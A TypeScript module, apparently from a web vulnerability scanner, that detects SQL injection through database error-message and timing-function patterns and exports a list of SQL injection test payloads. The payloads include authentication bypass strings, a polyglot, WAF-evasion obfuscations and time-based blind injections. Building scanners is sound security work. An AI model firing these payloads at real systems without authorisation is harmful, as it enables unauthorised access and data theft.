import { CrawlResponse } from '../../crawler/webcrawler.js';

export interface PatternMatch {
    type: 'sqli' | 'xss' | 'idor' | 'info_disclosure' | 'ssrf' | 'cmd_injection';
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
    pattern: string;
    match: string;
    context: string;
    confidence: number;
}

// SQL error patterns that indicate potential SQL injection
const SQL_ERROR_PATTERNS = [
    { pattern: /SQL syntax.*MySQL/i, db: 'MySQL' },
    { pattern: /Warning.*mysql_/i, db: 'MySQL' },
    { pattern: /MySqlException/i, db: 'MySQL' },
    { pattern: /valid MySQL result/i, db: 'MySQL' },
    { pattern: /PostgreSQL.*ERROR/i, db: 'PostgreSQL' },
    { pattern: /pg_query\(\)/i, db: 'PostgreSQL' },
    { pattern: /PSQLException/i, db: 'PostgreSQL' },
    { pattern: /Microsoft.*ODBC.*SQL Server/i, db: 'MSSQL' },
    { pattern: /Microsoft.*SQL.*Native.*Client/i, db: 'MSSQL' },
    { pattern: /SQLServerException/i, db: 'MSSQL' },
    { pattern: /Unclosed quotation mark/i, db: 'MSSQL' },
    { pattern: /ORA-\d{5}/i, db: 'Oracle' },
    { pattern: /Oracle.*Driver/i, db: 'Oracle' },
    { pattern: /SQLite.*error/i, db: 'SQLite' },
    { pattern: /SQLITE_ERROR/i, db: 'SQLite' },
    { pattern: /sqlite3\.OperationalError/i, db: 'SQLite' },
    { pattern: /System\.Data\.SQLite/i, db: 'SQLite' },
    { pattern: /JDBC.*SQLException/i, db: 'Generic' },
    { pattern: /quoted string not properly terminated/i, db: 'Generic' },
    { pattern: /SQL command not properly ended/i, db: 'Generic' },
    { pattern: /unexpected end of SQL command/i, db: 'Generic' },
];

// Patterns that suggest potential blind SQL injection
const BLIND_SQLI_INDICATORS = [
    /sleep\s*\(\s*\d+\s*\)/i,
    /waitfor\s+delay/i,
    /benchmark\s*\(/i,
    /pg_sleep\s*\(/i,
];

export function detectSqlInjection(response: CrawlResponse): PatternMatch[] {
    const matches: PatternMatch[] = [];
    const body = response.body;

    // Check for SQL error messages
    for (const { pattern, db } of SQL_ERROR_PATTERNS) {
        const match = body.match(pattern);
        if (match) {
            matches.push({
                type: 'sqli',
                severity: 'high',
                pattern: pattern.source,
                match: match[0],
                context: `SQL error from ${db} database detected in response`,
                confidence: 0.9,
            });
        }
    }

    // Check request parameters for SQLi payloads that might have been reflected
    const sqliPayloads = ["'", '"', '--', '/*', '*/', 'OR 1=1', 'AND 1=1', 'UNION SELECT'];
    for (const param of response.request.parameters) {
        for (const payload of sqliPayloads) {
            if (param.value.includes(payload)) {
                // If the payload is in the request and we got SQL errors, high confidence
                if (matches.length > 0) {
                    matches[0].confidence = 0.95;
                    matches[0].context += ` (payload "${payload}" in parameter "${param.name}")`;
                }
            }
        }
    }

    // Check for blind SQLi timing indicators
    for (const pattern of BLIND_SQLI_INDICATORS) {
        if (pattern.test(body)) {
            matches.push({
                type: 'sqli',
                severity: 'high',
                pattern: pattern.source,
                match: 'Blind SQLi indicator',
                context: 'Response contains SQL timing function - possible blind SQL injection',
                confidence: 0.7,
            });
        }
    }

    return matches;
}

// SQL injection test payloads
// SQL injection test payloads
export const SQLI_PAYLOADS = [
    // Polyglots (High Efficiency)
    { payload: "javascript:/*</title>*/\"/*//*/'/*//\"/*--></script>1' OR 1=1--", purpose: 'Universal Polyglot' },
    { payload: "1';SELECT * FROM information_schema.tables;", purpose: 'Generic Information Leak' },

    // Auth Bypass
    { payload: "' OR '1'='1' -- ", purpose: 'Auth Bypass (Standard)' },
    { payload: "admin' --", purpose: 'Admin user injection' },
    { payload: "admin' #", purpose: 'Admin user injection (MySQL)' },

    // Error-based
    { payload: "'", purpose: 'Single quote - basic error test' },
    { payload: '"', purpose: 'Double quote - error test' },
    { payload: '`', purpose: 'Backtick - MySQL specific' },
    { payload: "') OR ('1'='1", purpose: 'Parenthesis bypass' },

    // WAF Bypass / Obfuscation
    { payload: "/*!50000SELECT*/ 1", purpose: 'MySQL Comment obfuscation' },
    { payload: "UnIoN/+SeLeCT", purpose: 'Case variation + whitespace bypass' },
    { payload: "%27%20OR%201=1--", purpose: 'URL Encoded OR' },

    // Time-based (Safe)
    { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", purpose: 'Time- based (MySQL Safe)' },
    { payload: "'; WAITFOR DELAY '0:0:5'--", purpose: 'Time-based blind (MSSQL)' },
    { payload: "') AND SLEEP(5)--", purpose: 'Time- based (Parenthesis)' },

    // Boolean-based
    { payload: "' AND 1=1--", purpose: 'Boolean-based blind (true)' },
    { payload: "' AND 1=2--", purpose: 'Boolean-based blind (false)' },
];
